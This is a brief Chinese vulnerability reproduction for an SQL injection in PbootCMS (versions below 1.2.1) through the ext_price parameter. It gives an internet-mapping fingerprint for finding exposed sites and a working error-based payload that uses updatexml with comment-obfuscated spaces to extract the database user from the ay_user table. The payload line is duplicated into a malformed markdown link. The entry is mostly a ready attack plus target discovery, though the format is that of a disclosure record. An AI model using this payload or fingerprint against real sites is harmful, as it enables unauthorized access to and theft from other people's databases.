# PbootCMS ext_price SQL注入漏洞

## 漏洞描述

PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

```
PbootCMS < 1.2.1
```

## 网络测绘

```
app="PBOOTCMS"
```

## 漏洞复现

主页

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112244732.png)

测试 Payload

```plain
/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112244733.png)